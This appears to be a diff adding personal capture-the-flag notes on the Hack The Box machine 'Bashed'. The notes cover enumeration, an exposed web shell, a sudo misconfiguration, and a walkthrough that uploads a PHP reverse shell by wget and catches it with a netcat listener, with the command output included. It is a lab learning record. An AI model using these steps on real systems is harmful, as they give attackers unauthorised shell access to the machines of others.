@@ -1,0 +1,79 @@
+#####################
+# Sources and Links #
+#####################
+
+#########
+# TL,DR #
+#########
+
+########
+# Hack #
+########
+nmap only shows port 80
+gobuster shows lots of things!
+
+/dev/ directory has a phpbash.php shell!
+We can navigate to /home/arrexel and get user!
+
+www-data@bashed
+:/home/arrexel# cat user.txt
+REDACTED FOR WALKTHROUGH
+
+Now let's try to elevate privs and get root!
+
+User www-data may run the following commands on bashed:
+(scriptmanager : scriptmanager) NOPASSWD: ALL
+
+It looks like we can run scriptmanager as root
+
+/var/www/html/uploads is world-writable
+
+We can upload a php script to /uploads and run it!
+Pentestmonkey has created a script that is included in kali :)
+Reference:
+http://pentestmonkey.net/tools/php-reverse-shell
+
+kali: cp /usr/share/webshells/php/php-reverse-shell.php myShell.php
+Edit myShell.php to include kali's IP and say, port 4000
+
+Set up a webserver on kali to serve the file to victim.
+kali: sudo python -m SimpleHTTPServer 80
+
+Set up a netcat listener on kali with same port # in myShell.php
+nc -lvnp 4000
+
+vic: browse to the world-writable directory /var/www/html/uploads
+Upload the script from kali to vic
+wget 10.10.14.15/myShell.php
+Saving to: 'myShell.php'
+
+0K ..... 100% 173K=0.03s
+
+2020-02-02 12:09:22 (173 KB/s) - 'myShell.php' saved [5493/5493]
+
+vic: browse to 10.10.10.68/uploads/myShell.php
+
+kali:
+ryan@kali:~/HackTheBox/Bashed_68$ nc -lvnp 4000
+listening on [any] 4000 ...
+ls
+connect to [10.10.14.15] from (UNKNOWN) [10.10.10.68] 53860
+
+We have a shell!
+It's a dumb shell, but we can switch user 'scriptmanager'
+
+$ sudo -u scriptmanager /bin/sh
+whoami
+scriptmanager
+
+###########
+# Learned #
+###########
+
+sudo -l shows what commands can be run
+
+view local pyton modules with python shell: help('modules')
+
+find / -writable -type d 2>/dev/null            World-writeable folders
+
+https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
